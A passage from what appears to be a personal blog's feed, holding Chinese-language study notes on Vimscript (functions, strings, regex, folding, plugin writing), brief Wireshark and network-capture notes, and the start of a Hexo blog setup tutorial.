href="#24-Function-Arguments" class="headerlink" title="24 Function Arguments"></a>24 Function Arguments</h2><h3 id="对scope的理解"><a href="#对scope的理解" class="headerlink" title="对scope的理解"></a>对scope的理解</h3><p>可能是和名称空间差不多的玩意。</p><p><code>a:name</code>这里的<code>:a</code>表示variable scope。</p><p>所有的变量调用时都要加上<code>a:</code></p><p>Global variable need to be accessed with <code>:g</code>.</p><hr><h3 id="Varargs"><a href="#Varargs" class="headerlink" title="Varargs"></a>Varargs</h3><pre><code class="hljs">function Varg(...)    echom a:0    echom a:1    echom a:000endfunction</code></pre><p><code>a:0</code>表示extra variable的数量。</p><p><code>a:1</code>表示第一个extra variable的值。</p><p><code>a:000</code>表示所有extra variable的列表。</p><h3 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h3><pre><code class="hljs">function AssignGood(foo)    let a:foo_tmp = a:fooendfunction</code></pre><p>Read <code>:help function-argument</code><br>Read <code>:help local-variables</code></p><h2 id="25-Numbers"><a href="#25-Numbers" class="headerlink" title="25 Numbers"></a>25 Numbers</h2><p>Two types:</p><ul><li>Numbers, 32 bit signed</li><li>Floats</li></ul><p>以<code>0</code>开头的数字表示octal number，以<code>0x</code>开头的数字表示hex。</p><pre><code class="hljs">echo 5e4</code></pre><p>会报错。</p><h3 id="Coercion"><a href="#Coercion" class="headerlink" title="Coercion"></a>Coercion</h3><pre><code class="hljs">echo 2 * 2.0</code></pre><p>结果为浮点数。</p><h3 id="division"><a href="#division" class="headerlink" title="division"></a>division</h3><pre><code class="hljs">echo 3 / 2 </code></pre><p>结果为1.</p><pre><code class="hljs">echo 3 / 2.0</code></pre><p>结果为1.5.</p><p>Read <code>:help Float</code><br>Read <code>:help float-point-precision</code></p><h2 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h2><h3 id="Concatenation"><a href="#Concatenation" class="headerlink" title="Concatenation"></a>Concatenation</h3><pre><code class="hljs">echom “Hello,” + “world”</code></pre><p>输出0，vim的<code>+</code>只用于numbers。</p><p>vim不会coerce string to float</p><pre><code class="hljs">echom 10 + “10.10”</code></pre><p>输出20.</p><p><code>.</code> is the concatenate strings operator.</p><pre><code class="hljs">echom “Hello， ” . “world”</code></pre><p>将两个string连接起来。</p><pre><code class="hljs">echom 10.1 . “foo”</code></pre><p>会报错。</p><p>Don’t rely on Vim’s coercion.</p><h3 id="Special-Characters"><a href="#Special-Characters" class="headerlink" title="Special Characters"></a>Special Characters</h3><p>用<code>\</code>转义。</p><p><code>foo^@bar</code>中的<code>^@</code> is Vim’s way of saying “newline character”.</p><h3 id="Literal-Strings"><a href="#Literal-Strings" class="headerlink" title="Literal Strings"></a>Literal Strings</h3><p>使用单引号<code>’ ’</code>。</p><p>里面没有转义字符。</p><pre><code class="hljs">echom ‘\n\\’</code></pre><p>显示<code>\n\\</code>.</p><h3 id="Truthiness"><a href="#Truthiness" class="headerlink" title="Truthiness"></a>Truthiness</h3><hr><p>Read <code>:help express-quote</code><br>Read <code>:help i_CTRL-V</code><br>Read <code>:help literal-string</code></p><hr><h2 id="27-String-Functions"><a href="#27-String-Functions" class="headerlink" title="27 String Functions"></a>27 String Functions</h2><h3 id="Length"><a href="#Length" class="headerlink" title="Length"></a>Length</h3><pre><code class="hljs">echom strlen(“foo”)</code></pre><h3 id="Splitting"><a href="#Splitting" class="headerlink" title="Splitting"></a>Splitting</h3><pre><code class="hljs">echo split(“one two three”)</code></pre><p>输出<code>[‘one’, ‘two’, ‘three’]</code>.</p><p>将字符串分解为list。</p><pre><code class="hljs">echo split(“one, two, three”, “,”)</code></pre><p>输出<code>[‘one’, ‘two’, ‘three’]</code>，此时是以<code>,</code>作为分隔，若不指定则默认为空白字符。</p><h3 id="Joining"><a href="#Joining" class="headerlink" title="Joining"></a>Joining</h3><pre><code class="hljs">echo join([“foo”, “bar”], “...”)</code></pre><p>输出<code>foo...bar</code>，就是用后面指定的符号连接列表中的各元素。</p><p>和split配合使用</p><pre><code class="hljs">echo join(split(“foo bar”), “;”)</code></pre><p>输出<code>foo;bar</code>.</p><h3 id="Lower-and-Upper-Case"><a href="#Lower-and-Upper-Case" class="headerlink" title="Lower and Upper Case"></a>Lower and Upper Case</h3><pre><code class="hljs">echom tolower(“Foo”)echom toupper(“Foo”)</code></pre><hr><p>Read <code>:help split()</code><br>Read <code>:help join()</code><br>Read <code>:help functions</code></p><hr><h2 id="28-Execute"><a href="#28-Execute" class="headerlink" title="28 Execute"></a>28 Execute</h2><p>判断一个字符串是否是Vimscript的命令。</p><h3 id="Basic-Excution"><a href="#Basic-Excution" class="headerlink" title="Basic Excution"></a>Basic Excution</h3><pre><code class="hljs">execute “echom ‘Hello, world!’”</code></pre><p>输出<code>’Hello world!’</code></p><p>Can not be followed by a comment.</p><hr><p>Read <code>:help execute</code></p><p>Read <code>:help leftabove</code>, <code>:help rightbelow</code>,<code>:help split</code>,<code>:help vsplit</code>.</p><hr><h2 id="29-Normal"><a href="#29-Normal" class="headerlink" title="29 Normal"></a>29 Normal</h2><pre><code class="hljs">normal G</code></pre><p>移动到文件底部。</p><h3 id="Avoiding-Mapping"><a href="#Avoiding-Mapping" class="headerlink" title="Avoiding Mapping"></a>Avoiding Mapping</h3><p>使用<code>normal!</code>相当于norecuision的作用，在写Vimscript的时候要用<code>normal!</code>。</p><h3 id="Special-Characters-1"><a href="#Special-Characters-1" class="headerlink" title="Special Characters"></a>Special Characters</h3><p><code>normal!</code>不能识别特殊字符如<code>&lt;cr&gt;</code>它会将其视为<code>‘&lt;’ ‘c’ ’r’ ’&gt;’</code>.</p><p><code>execute</code>和<code>normal!</code>结合可以解决以上问题。</p><pre><code class="hljs">:execute “normal! gg/foo\&lt;cr&gt;dd”</code></pre><p>此处要使用转义<code>\</code></p><hr><p>Read <code>:help normal</code></p><hr><h3 id="Extra-Credit"><a href="#Extra-Credit" class="headerlink" title="Extra Credit"></a>Extra Credit</h3><p>Skip 掉了</p><h2 id="30-Execute-Normal"><a href="#30-Execute-Normal" class="headerlink" title="30 Execute Normal!"></a>30 Execute Normal!</h2><p>Read <code>:help express-quote</code></p><h2 id="31-Basic-Regular-Expressions"><a href="#31-Basic-Regular-Expressions" class="headerlink" title="31 Basic Regular Expressions"></a>31 Basic Regular Expressions</h2><p>Use <code>?</code> to search backward instead of forward.</p><pre><code class="hljs">execute “normal! G?print\&lt;cr&gt;”</code></pre><p>也就是说<code>/</code>是以forward的方式查找，<code>?</code>是以backward的方式查找。</p><h3 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h3><p><code>magic</code>选项就是存在<code>\n</code>这类普通字符前面加一个<code>\</code>就有了特殊含义，以及<code>\.</code>将原本有特殊含义的词变为普通的字符。</p><pre><code class="hljs">execute “normal! gg/for .\\+ in .\\+:\&lt;cr&gt;”</code></pre><p>此处的正则表达式中的<code>+</code>需写成<code>\+</code>才能发挥作用，所以<code>\\</code>是为了转义一个<code>\</code>.</p><p>在Vim中，单引号阔起来的都表示单个字符如<code>a\nb</code>，表示四个字符。</p><pre><code class="hljs">:execute “normal! gg” . ‘/for .\+ in .\+:’ . “\&lt;cr&gt;”</code></pre><h3 id="Very-Magic"><a href="#Very-Magic" class="headerlink" title="Very Magic"></a>Very Magic</h3><p>Very magic就是：所有的ASCII字符除了 ‘0’-‘9’， ‘a’-‘z’，‘A’-‘Z’和‘_’外的字符都有特殊含义。</p><p>Vim 有四种parse regex的方法，添加<code>\v</code>能够让这种regex语法最接近其他语言中的正则表达式, <code>\v</code>是”very magic“模式。</p><pre><code class="hljs">‘/\vfor .+ in .+:’</code></pre><hr><p>Read <code>:help magic</code><br>Read <code>:help pattern-overview</code><br>Read <code>:help match</code><br>Read <code>:help nohlsearch</code></p><hr><h2 id="32-Case-Study-Grep-Operator-Part-One"><a href="#32-Case-Study-Grep-Operator-Part-One" class="headerlink" title="32 Case Study: Grep Operator, Part One"></a>32 Case Study: Grep Operator, Part One</h2><hr><p>Read <code>:help grep</code><br>Read <code>:help make</code><br>Read <code>:help quickfix-window</code></p><hr><h3 id="Escaping-Shell-Command-Arguments"><a href="#Escaping-Shell-Command-Arguments" class="headerlink" title="Escaping Shell Command Arguments"></a>Escaping Shell Command Arguments</h3><p><code>&lt;cword&gt;</code>用在命令中，Vim会在命令被执行前把它替换为光标下的单词。</p><p><code>&lt;cWORD&gt;</code>会替换为整个单词。</p><p>两个的区别在如foo-bar, 前者会替换为foo，后者会替换为foo-bar.</p><p>Vim会在如<code>&lt;cword&gt;</code>扩展之前就运行shellescape()，因此要使用expand(), 让<code>&lt;cword&gt;</code>在shellescape()执行之前展开。</p><pre><code class="hljs">:nnoremap &lt;leader&gt;g :execute “grep！ -R ” . shellescape(expand(“&lt;cWORD&gt;”)) . “ .”&lt;cr&gt;:copen&lt;cr&gt;</code></pre><p><code>grep!</code>防止跳转至第一条。</p><p><code>copen</code>的作用是打开quickfix，可调整高度。</p><p><code>cnext</code>是切换到下一个error的位置。</p><p><code>cprevious</code>是切换到前一个。</p><hr><p>Read <code>:help :grep</code><br>Read <code>:help cword</code><br>Read <code>:help cnext</code><br>Read <code>:help cprevious</code><br>Read <code>:help expand</code><br>Read <code>:help copen</code><br>Read <code>:help silent</code></p><hr><h2 id="33-Case-Study-Grep-Operator-Part-Two"><a href="#33-Case-Study-Grep-Operator-Part-Two" class="headerlink" title="33 Case Study: Grep Operator, Part Two"></a>33 Case Study: Grep Operator, Part Two</h2><p><code>～/vim/plugin</code>目录，操作其中的文件时可以用<code>:source %</code>加载。</p><hr><h3 id="Visual-Mode"><a href="#Visual-Mode" class="headerlink" title="Visual Mode"></a>Visual Mode</h3><p><code>&lt;c-u&gt;</code>的作用，避免出现<code>:’&lt;,’&gt;</code>.</p><p><code>visualmode()</code>返回visualmode的模式。</p><p>变量由<code>@</code>开头的都是寄存器。</p><p><code>@@</code>是未命名的寄存器，存放复制和删除的text(未指定寄存器的)。</p><p><code>function!</code>前面的<code>!</code>表示重写一个function。</p><hr><p>Read <code>:help visulmode</code><br>Read <code>:help c_ctrl-u</code><br>Read <code>:help operatorfunc</code><br>Read <code>:help map-operator</code></p><hr><p><code>operatorfunc</code>是个选项，如</p><pre><code class="hljs">:set operatorfunc=GrepOperator</code></pre><p>这样，就可以用<code>g@</code>来调用GrepOperator这个函数。</p><p>‘&#96;[‘放在定义为motion的text前面.</p><hr><h2 id="34-Case-Study-Grep-Operator-Part-Three"><a href="#34-Case-Study-Grep-Operator-Part-Three" class="headerlink" title="34 Case Study: Grep Operator, Part Three"></a>34 Case Study: Grep Operator, Part Three</h2><hr><h3 id="Namespacing"><a href="#Namespacing" class="headerlink" title="Namespacing"></a>Namespacing</h3><p><SID>, 会被扩展为<code>&lt;SNR&gt;num</code>num表示一个特殊的数字。</p><p><code>s:</code>添加到函数前，使之处于当前的名称空间。</p><hr><p>Read <code>:help &lt;SID&gt;</code></p><hr><h2 id="35-Lists"><a href="#35-Lists" class="headerlink" title="35 Lists"></a>35 Lists</h2><h3 id="indexing"><a href="#indexing" class="headerlink" title="indexing"></a>indexing</h3><p><code>0</code>表示第一个元素。</p><p><code>-1</code>表示倒数第一个元素，<code>-2</code>表示倒数第二个元素。</p><hr><h3 id="slicing"><a href="#slicing" class="headerlink" title="slicing"></a>slicing</h3><p>分割。</p><pre><code class="hljs">:echo [‘a’, ‘b’, ‘c’, ‘d’, ‘e’][0:2]</code></pre><p>显示<code>[’a’, ‘b’ , ‘c’]</code> </p><hr><h3 id="Concatenation-1"><a href="#Concatenation-1" class="headerlink" title="Concatenation"></a>Concatenation</h3><pre><code class="hljs">:echo [‘a’, ’b’] + [‘c’]</code></pre><hr><h3 id="List-Function"><a href="#List-Function" class="headerlink" title="List Function"></a>List Function</h3><p>Read <code>:help List</code><br>Read <code>:help add()</code><br>Read <code>:help len()</code><br>Read <code>:help get()</code><br>Read <code>:help index()</code><br>Read <code>:help join()</code><br>Read <code>:help reverse()</code><br>Read <code>:help functions</code></p><hr><h2 id="36-Looping"><a href="#36-Looping" class="headerlink" title="36 Looping"></a>36 Looping</h2><h3 id="For-Loops"><a href="#For-Loops" class="headerlink" title="For Loops"></a>For Loops</h3><pre><code class="hljs">:let c = 0:for i in [1, ,2 ,3, 4]:  let c += i:endfor:echo c</code></pre><hr><h3 id="While-Loops"><a href="#While-Loops" class="headerlink" title="While Loops"></a>While Loops</h3><pre><code class="hljs">:let c = 1:let total = 0:while c &lt;= 4:  let total += c:  let c += 1:endwhile:echom total</code></pre><hr><p>Read <code>:help for</code><br>Read <code>:help while</code></p><hr><h2 id="Dictionaries"><a href="#Dictionaries" class="headerlink" title="Dictionaries"></a>Dictionaries</h2><pre><code class="hljs">:echo &#123;‘a’: 1, 100: ‘foo’&#125;:echo &#123;‘a’: 1, 100: ‘foo’,&#125;</code></pre><hr><h3 id="Indexing"><a href="#Indexing" class="headerlink" title="Indexing"></a>Indexing</h3><pre><code class="hljs">:echo &#123;‘a’: 1, 100: ‘foo’,&#125;[‘a’]:echo &#123;‘a’: 1, 100: ‘foo’,&#125;.a</code></pre><hr><h3 id="Assigning-and-Adding"><a href="#Assigning-and-Adding" class="headerlink" title="Assigning and Adding"></a>Assigning and Adding</h3><pre><code class="hljs">:let foo = &#123;‘a’: 1&#125;:let foo.a = 100:let foo.b = 200:echo foo</code></pre><hr><h3 id="Removing-Entries"><a href="#Removing-Entries" class="headerlink" title="Removing Entries"></a>Removing Entries</h3><pre><code class="hljs">:let test = remove(foo, ‘a’):unlet foo.b:echo foo:echo test</code></pre><p>多数使用<code>remove()</code></p><hr><h3 id="Dictionary-Function"><a href="#Dictionary-Function" class="headerlink" title="Dictionary Function"></a>Dictionary Function</h3><p>Read <code>:help Dictionary</code><br>Read <code>:help get()</code><br>Read <code>:help has_key()</code><br>Read <code>:help items()</code><br>Read <code>:help keys()</code><br>Read <code>:help values()</code></p><hr><h2 id="38-Toggling"><a href="#38-Toggling" class="headerlink" title="38 Toggling"></a>38 Toggling</h2><h3 id="Restoring-Windows-x2F-Buffers"><a href="#Restoring-Windows-x2F-Buffers" class="headerlink" title="Restoring Windows&#x2F;Buffers"></a>Restoring Windows&#x2F;Buffers</h3><p>每一个window都有一个号。</p><hr><p>Read <code>:help foldcolumn</code><br>Read <code>:help winnr()</code><br>Read <code>:help ctrl-w_w</code><br>Read <code>:help wincmd</code></p><hr><pre><code class="hljs">execute a:number . “wincmd operator”</code></pre><hr><h3 id="Functional-Programming"><a href="#Functional-Programming" class="headerlink" title="Functional Programming"></a>Functional Programming</h3><hr><h3 id="Functions-as-Variables"><a href="#Functions-as-Variables" class="headerlink" title="Functions as Variables"></a>Functions as Variables</h3><p>可以用变量存储函数，这时变量要以大写字母开头</p><pre><code class="hljs">:let Myfunc = function(“Append”):echo Myfunc([1, 2], 3)</code></pre><hr><h3 id="Higher-Order-Function"><a href="#Higher-Order-Function" class="headerlink" title="Higher-Order Function"></a>Higher-Order Function</h3><p>就是通过调用其他函数完成任务的函数。</p><p>Read <code>:help map</code><br>Read <code>:help sort()</code><br>Read <code>:help reverse()</code><br>Read <code>:help copy()</code><br>Read <code>:help deepcopy()</code><br>Read <code>:help function()</code><br>Read <code>:help type()</code></p><hr><h2 id="40-Paths-1"><a href="#40-Paths-1" class="headerlink" title="40 Paths"></a>40 Paths</h2><p><code>%</code> 表示当前文件。</p><p><code>%:p</code>表示绝对路径。</p><p>Read <code>:help expand()</code><br>Read <code>:help fnamemodify()</code><br>Read <code>:help filename-modifiers</code><br>Read <code>:help simplify</code><br>Read <code>:help resolve()</code><br>Read <code>:help globpath()</code><br>Read <code>:help wildcards</code></p><hr><h2 id="41-Creating-a-Full-Plugin"><a href="#41-Creating-a-Full-Plugin" class="headerlink" title="41 Creating a Full Plugin"></a>41 Creating a Full Plugin</h2><hr><h2 id="42-Plugin-Layout-in-the-Dark-Ages"><a href="#42-Plugin-Layout-in-the-Dark-Ages" class="headerlink" title="42 Plugin Layout in the Dark Ages"></a>42 Plugin Layout in the Dark Ages</h2><hr><h2 id="43-A-New-Hope-Plugin-Layout-with-Pathogen"><a href="#43-A-New-Hope-Plugin-Layout-with-Pathogen" class="headerlink" title="43 A New Hope: Plugin Layout with Pathogen"></a>43 A New Hope: Plugin Layout with Pathogen</h2><hr><h2 id="45-Basic-Syntax-Highlighting"><a href="#45-Basic-Syntax-Highlighting" class="headerlink" title="45 Basic Syntax Highlighting"></a>45 Basic Syntax Highlighting</h2><p>注意防止重复加载的判断，和防止多次加载头文件一样。</p><hr><p>Read <code>:help syn-keyword</code><br>Read <code>:help iskeyword</code><br>Read <code>:help group-name</code></p><hr><p>syn-keyword中的option, 就是可以用简写。</p><p>把你自己的group link 到其他的group，就可以有一样的highlighting。大小写不敏感。</p><hr><h2 id="46-Advanced-Syntax-Highlighting"><a href="#46-Advanced-Syntax-Highlighting" class="headerlink" title="46 Advanced Syntax Highlighting"></a>46 Advanced Syntax Highlighting</h2><p><code>syntax keyword</code>的作用大概是自己定义一个keyword group。</p><p><code>syntax match</code>同样要自己定义一个group，只不过后面跟的是正则表达式。其不允许一行多个group。</p><p>后定义的group有更高的优先级。</p><p>Keyword的优先级高于Match和Region.</p><p>如：</p><pre><code class="hljs">syntax match potionComment “\v#.*$”</code></pre><hr><p>Read <code>:help syn-match</code><br>Read <code>:help syn-priority</code></p><hr><h2 id="47-Even-More-Advanced-Syntax-Highlighting"><a href="#47-Even-More-Advanced-Syntax-Highlighting" class="headerlink" title="47 Even More Advanced Syntax Highlighting"></a>47 Even More Advanced Syntax Highlighting</h2><p>Read <code>:help syntax</code></p><hr><h3 id="Highlighting-Strings"><a href="#Highlighting-Strings" class="headerlink" title="Highlighting Strings"></a>Highlighting Strings</h3><p>用<code>syntax region</code>, 注意<code>start</code>,<code>skip</code>,<code>end</code></p><p>Read <code>:help syn-region</code></p><hr><h2 id="48-Basic-Folding"><a href="#48-Basic-Folding" class="headerlink" title="48 Basic Folding"></a>48 Basic Folding</h2><p>Read <code>:help usr_28</code></p><hr><p>所有的fold操作以<code>z</code>开头。</p><p>保存fold，<code>mkview</code> 和 <code>loadview</code>.</p><p>用<code>viewdir</code> 选项查看。</p><p>按照缩进fold<code>set foldmethod=indent</code></p><p><code>foldlevel</code>和<code>shiftwidth</code>相关。</p><p>利用<code>foldmethod</code>选择折叠方式。</p><hr><p><mark>Vim中local和全局的作用。</mark></p><p>设置了local之后，会更加specific，因此优先级会更高。</p><hr><p>Read <code>:help foldmethod</code><br>Read <code>:help fold-manual</code><br>Read <code>:help fold-marker</code><br>Read <code>:help help foldmarkr</code><br>Read <code>:help fold-indent</code><br>Read <code>:help fdl</code><br>Read <code>:help foldlevelstart</code><br>Read <code>:help foldminlines</code><br>Read <code>:help foldignore</code></p><hr><h2 id="49-Advanced-Folding"><a href="#49-Advanced-Folding" class="headerlink" title="49 Advanced Folding"></a>49 Advanced Folding</h2><h3 id="Folding-Theory"><a href="#Folding-Theory" class="headerlink" title="Folding Theory"></a>Folding Theory</h3><p>每一行代码都有一个<code>foldlevel</code>.</p><p>当前自己的理解，一个tab键的缩进就是让foldlevel加1，fold indent是按照每一行的foldlevel折叠的，相邻的折在一起，但相邻的foldlevel不一定相等。</p><hr><h3 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>每当<code>:set filetype=potion</code>时，都会加载<code>ftplugin/potion</code>.</p><hr><h3 id="Expr-Folding"><a href="#Expr-Folding" class="headerlink" title="Expr Folding"></a>Expr Folding</h3><p><code>foldignore</code>只对<code>foldmethod</code>为indent时有效。</p><p>字符<code>’-1’</code>表示这一行的foldlevel是<code>undefined</code>, 这一行的foldlevel会和the line above or below哪一个的foldlevel小，就等于哪一个。</p><hr><p>Read <code>:help foldexpr</code><br>Read <code>:help fold-expr</code><br>Read <code>:help getline</code><br>Read <code>:help indent()</code><br>Read <code>:help line()</code></p><hr><h3 id="An-Indentation-Level-Helper"><a href="#An-Indentation-Level-Helper" class="headerlink" title="An Indentation Level Helper"></a>An Indentation Level Helper</h3><p><code>shiftwidth</code>的值就是一个<code>tab</code>键的长度。<code>tabstop</code>的值也是<code>tab</code>的空格数。</p><p><code>indent()</code>返回某一行的前面的space数。</p><p><code>=～？</code>的意思是后面为正则表达式且大小写不敏感。</p><p><code>&gt;</code>表示另一个Vim中的特殊<code>foldlevel</code>, 如<code>&gt;1</code>告诉Vim以1从这个foldlevel打开当前行。记忆方法，从左到右可以进去，所以是从这里开始打开。</p><hr><p><mark>对fold的理解</mark><br>这个玩意就是靠foldlevel来fold，比如的<code>foldmethod=indent</code>时，此时的foldlevel取决于indent数量。</p><p>当<code>foldmethod=expr</code>时，此时的foldlevel取决于后面表达式的值，后面的返回值也是数字，来表示foldlevel，这个<code>foldexpr=</code>后面一个东西会对每一行计算，最终会算出每一行的foldlevel。所以当我之前设置<code>:set foldexpr=1</code>的时候会全部折叠，其实不管我后面写多少都会全部折叠，因为这样写相当于我把每一行的foldlevel都设置为了1.</p><p>这下子<mark>fold的原则</mark>就通透了：</p><ol><li>每一行都有一个foldlevel。</li><li>foldlevel为0则不会折叠。</li><li>相邻的行若有相同的foldlevel则折叠在一起。</li><li>当一个foldlevel如1折叠时，随后的行中若foldlevel高于1也会折叠，直到一个低于1的。</li></ol><p><mark>对<code>foldexpr</code>的理解</mark><br>foldexpr得到一个值，进而判断这一行是否为fold。</p><hr><h2 id="50-Section-Movement-Theory"><a href="#50-Section-Movement-Theory" class="headerlink" title="50 Section Movement Theory"></a>50 Section Movement Theory</h2><p>Read <code>:help section</code></p><hr><h3 id="Nroff"><a href="#Nroff" class="headerlink" title="Nroff"></a>Nroff</h3><p>nroff和troff都起源于roff，是一种类似于LaTex和Markdown的语言，用于UNIX和UNIX-like操作系统，是man page的排版格式。</p><p>.SH是section heading.</p><hr><p><code>[[</code>和<code>]]</code>用于找<code>&#123;</code>.</p><p><code>[]</code>和<code>][</code>用于找<code>&#125;</code>.</p><hr><h2 id="51-Potion-Section-Movement"><a href="#51-Potion-Section-Movement" class="headerlink" title="51 Potion Section Movement"></a>51 Potion Section Movement</h2><p>Read <code>:help line-continuation</code></p><p><mark><SID></mark><br>首先，<code>&lt;SID&gt;</code>在脚本运行时会被扩展为<code>&lt;SNR&gt;12_</code>，12是我随便写的数字，所以可以把<SID>视为下面的简写形式，这个数字是用于标记当前脚本的unique number。</p><p>它解决了一个问题，在Vim中，你调用了一个函数，它不知道其在哪里定义的，<SID>能让Vim找到它的定义。</p><hr><h3 id="Base-Movement"><a href="#Base-Movement" class="headerlink" title="Base Movement"></a>Base Movement</h3><p><code>%^</code> a special Vim regent atom that means “beginning of file”</p><p>Read <code>:help search()</code><br>Read <code>:help ordinary-atom</code></p><hr><h2 id="52-External-Commands"><a href="#52-External-Commands" class="headerlink" title="52 External Commands"></a>52 External Commands</h2><p><code>silent</code>理解<br>就是屏蔽掉输出的报告信息，就是回到命令行界面，然后说press enter to return的那种。</p><hr><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>The system() function takes a command string as a parameter and returns the output of that command as a String.</p><p>Read <code>:help bufname</code><br>Read <code>:help bufbyte</code><br>Read <code>:help append()</code><br>Read <code>:help split()</code><br>Read <code>:help :!</code><br>Read <code>:help read</code><br>Read <code>:help read!</code><br>Read <code>:help system()</code><br>Read <code>:help design-not</code><br>Read <code>:help bufwinnr()</code></p><hr><h2 id="53-Autoloading"><a href="#53-Autoloading" class="headerlink" title="53 Autoloading"></a>53 Autoloading</h2><p>如：</p><pre><code class="hljs">call somefile#Hello()</code></pre><p>则Vim会寻找<code>~/.vim/autoload/somefile.vim</code>文件</p><p>Read <code>:help autoload</code><br>Read <code>:help silent!</code></p><hr><h2 id="54-Documentation"><a href="#54-Documentation" class="headerlink" title="54 Documentation"></a>54 Documentation</h2><p>通过filetype可以做很多事，比如<code>:set filetype=help</code>能够使用help文档的高亮。</p><p>Read <code>:help help-writing</code><br>Read <code>:help :left</code><br>Read <code>:help :right</code><br>Read <code>:help :center</code></p><hr><h2 id="55-Distribution"><a href="#55-Distribution" class="headerlink" title="55 Distribution"></a>55 Distribution</h2><hr><h2 id="56-What-Now"><a href="#56-What-Now" class="headerlink" title="56 What Now?"></a>56 What Now?</h2><p>Read <code>:help highlight</code><br>Read <code>:help user-commands</code><br>Read <code>:help runtimepath</code><br>Read <code>:help ins-completion</code><br>Read <code>:help omnifunc</code><br>Read <code>:help come-omni</code><br>Read <code>:help quickfix.txt</code><br>Read <code>:help perl-using</code></p><p><img src="/media/16565746214097.png"></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark 网络分析</title>
    <link href="/2022/08/25/Wireshark%20%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90/"/>
    <url>/2022/08/25/Wireshark%20%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="src"><a href="#src" class="headerlink" title="src"></a>src</h3><p>source的简称。</p><h1 id="初试锋芒"><a href="#初试锋芒" class="headerlink" title="初试锋芒"></a>初试锋芒</h1><p>ARP广播是在整个局域网。</p><h2 id="查询网络配置"><a href="#查询网络配置" class="headerlink" title="查询网络配置"></a>查询网络配置</h2><blockquote><p>ifconfig |egrep “HWaddr|inet addr”<br>route |grep default</p></blockquote><h2 id="VLAN的作用"><a href="#VLAN的作用" class="headerlink" title="VLAN的作用"></a>VLAN的作用</h2><p>把连接在同一交换机下的主机分为更小的逻辑网段，以减少广播的数量，</p><p>不同的VLAN之间不能通讯,这样广播就被限制在同一个业务需求主机的VLAN里,</p><p>即便是连接在同一个交换机下,不同的VLAN也不会收到广播的ARP请求!”</p><h2 id="ARP请求"><a href="#ARP请求" class="headerlink" title="ARP请求"></a>ARP请求</h2><p>通过广播查找。</p><h2 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h2><blockquote><p>netstat -rn</p></blockquote><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>一.抓包<br>抓包时应该尽量只抓必要的部分。<br>1.只抓包头，设置抓取的长度。Capture—-&gt;Options中“Limit each packet to”</p><h3 id="tcpdump命令抓包"><a href="#tcpdump命令抓包" class="headerlink" title="tcpdump命令抓包"></a>tcpdump命令抓包</h3><p>用-s参数。</p><p>2.只抓必要的包。在Capture Fliter中输入如：“host10.32.200.131”</p><h3 id="ping命令能指定发送包的数量和大小"><a href="#ping命令能指定发送包的数量和大小" class="headerlink" title="ping命令能指定发送包的数量和大小"></a>ping命令能指定发送包的数量和大小</h3><p>二.个性化设置<br>三.过滤<br>1.协议名过滤<br>2.IP地址加port号<br>3.鼠标帮忙过滤</p><p>四.让wireshark自动分析</p><p>五.搜索功能<br>Ctrl+F</p><h3 id="Gerald-Combs"><a href="#Gerald-Combs" class="headerlink" title="Gerald Combs"></a>Gerald Combs</h3><p>编写了Ethereal，即后来的wireshark</p><h3 id="Sun-Microsysems公司"><a href="#Sun-Microsysems公司" class="headerlink" title="Sun Microsysems公司"></a>Sun Microsysems公司</h3><p>Sun是Stanford University Network的首字母。</p><h2 id="NFS协议"><a href="#NFS协议" class="headerlink" title="NFS协议"></a>NFS协议</h2><p>Network File System协议</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo个人博客搭建</title>
    <link href="/2022/08/25/hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/25/hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<hr><p><a href="https://b23.tv/myHAg1B">参考b站程序羊</a></p><hr><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>首先要安装nodejs和npm。</p><pre><code class="hljs">node -vnpm -v</code></pre><p>查看版本。</p><p>使用npm下载并切换镜像源：</p><pre><code class="hljs">npm install -g cnpm --registry=https://registry.npm.taobao.org</code></pre><p>下载hexo-cli：</p><pre><code class="hljs">cnpm install -g hexo-cli</code></pre><p>在用户目录下创建一个文件夹，初始化这个文件夹：</p><pre><code class="hljs">sudo mkdir Blogsudo hexo init</code></pre><p>启动hexo</p><pre><code class="hljs">sudo hexo s</code></pre><h2 id="hexo基本操纵"><a href="#hexo基本操纵" class="headerlink" title="hexo基本操纵"></a>hexo基本操纵</h2><p>一般生成完之后先<code>clean</code>, 然后<code>generate</code>, 最后 <code>server</code>. 将内容推送带github上去就是<code>deploy</code>操作。</p><h3 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h3><pre><code class="hljs">hexo new “My New Post”</code></pre><p><code>new</code>可简写为<code>n</code>.<br>创建的blog所在的位置，<code>source/_posts</code>中。&#x2F;</p><h3 id="启动hexo"><a href="#启动hexo" class="headerlink" title="启动hexo"></a>启动hexo</h3><pre><code class="hljs">hexo server</code></pre><p><code>server</code>可简写为<code>s</code></p><h3 id="文件生成"><a href="#文件生成" class="headerlink" title="文件生成"></a>文件生成</h3><p>在创建并写完一个文章之后，要生成一下。</p><pre><code class="hljs">hexo generate</code></pre><p><code>generate</code>可简写为<code>g</code>.</p><h3 id="在本地4000端口打开"><a href="#在本地4000端口打开" class="headerlink" title="在本地4000端口打开"></a>在本地4000端口打开</h3><p>一般用来测试。</p><p>这个是本地的，还未部署到远端。</p><h2 id="博客部署到Github上"><a href="#博客部署到Github上" class="headerlink" title="博客部署到Github上"></a>博客部署到Github上</h2><h3 id="在github上新建一个仓库。"><a 